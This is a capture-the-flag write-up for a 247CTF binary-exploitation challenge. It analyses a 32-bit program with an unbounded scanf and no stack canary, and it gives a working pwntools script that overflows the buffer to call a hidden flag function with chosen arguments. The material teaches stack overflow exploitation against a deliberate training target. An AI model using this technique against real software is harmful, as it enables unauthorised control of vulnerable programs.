# hidden_flag_function_with_args - 247CTF PWN Challenge

## Challenge Info
- **Name**: hidden_flag_function_with_args
- **Category**: PWN
- **Remote**: `tcp://1580dce5a55814e3.247ctf.com:50001`
- **Description**: "Can you control this applications flow to gain access to the hidden flag function with the correct parameters?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

### Protections
```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found   <- Stack overflow possible!
NX:         NX enabled
PIE:        No PIE (0x8048000) <- Fixed addresses
```

### Key Functions

#### flag() @ 0x08048576
```c
void flag(int a, int b, int c) {
    if (a == 0x1337 && b == 0x247 && c == 0x12345678) {
        // Read and print flag.txt
    }
}
```

#### chall() @ 0x080485f6
```c
void chall() {
    char buffer[0x88];  // 136 bytes at ebp-0x8c
    puts("How did you get here?");
    scanf("%s", buffer);  // No size limit - OVERFLOW!
}
```

### Stack Layout
```
+------------------+ <- High addresses
|     ...          |
+------------------+
|   Return Addr    | <- ebp + 4 (offset 140)
+------------------+
|    Saved EBP     | <- ebp (offset 136)
+------------------+
|                  |
|   buffer[136]    | <- ebp - 0x8c
|                  |
+------------------+ <- Low addresses
```

---

## Vulnerability

Buffer overflow in `chall()`:
- `scanf("%s", buffer)` reads unlimited input
- Buffer is 136 bytes
- No stack canary protection
- Can overwrite return address

---

## Exploitation

### 32-bit cdecl Calling Convention

In 32-bit x86, function arguments are passed on the stack:
```
+------------------+
|      arg3        | <- esp + 12
+------------------+
|      arg2        | <- esp + 8
+------------------+
|      arg1        | <- esp + 4
+------------------+
|   Return Addr    | <- esp (where function returns to)
+------------------+
```

### Payload Construction

```
payload = 'A' * 140           # Fill buffer + saved EBP
payload += p32(0x08048576)    # Return to flag()
payload += p32(0xdeadbeef)    # Fake return address (won't be used)
payload += p32(0x1337)        # arg1: 0x1337
payload += p32(0x247)         # arg2: 0x247
payload += p32(0x12345678)    # arg3: 0x12345678
```

### Stack After Overflow
```
+------------------+
|   0x12345678     | <- arg3 for flag()
+------------------+
|   0x00000247     | <- arg2 for flag()
+------------------+
|   0x00001337     | <- arg1 for flag()
+------------------+
|   0xdeadbeef     | <- fake return (flag() never returns)
+------------------+
|   0x08048576     | <- overwritten ret -> flag()
+------------------+
|   0x41414141     | <- overwritten saved EBP
+------------------+
|                  |
|   AAAAAAAAAA     | <- buffer filled with 'A's
|                  |
+------------------+
```

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

FLAG_FUNC = 0x08048576
OFFSET = 0x88 + 4  # 136 + 4 = 140 bytes

p = remote('1580dce5a55814e3.247ctf.com', 50001)

payload = b'A' * OFFSET
payload += p32(FLAG_FUNC)       # Return to flag()
payload += p32(0xdeadbeef)      # Fake return
payload += p32(0x1337)          # arg1
payload += p32(0x247)           # arg2
payload += p32(0x12345678)      # arg3

p.recvuntil(b'?')
p.sendline(payload)
print(p.recvall(timeout=5))
```

---

## Key Takeaways

1. **No canary + No PIE** = Classic stack buffer overflow
2. **32-bit cdecl**: Arguments on stack after return address
3. **ret2win with args**: Jump to existing function with controlled arguments
4. Simple "return-to-function" technique without needing shellcode or ROP chains

---

## Files
- `hidden_flag_function_with_args` - Challenge binary
- `solve.py` - Working exploit script
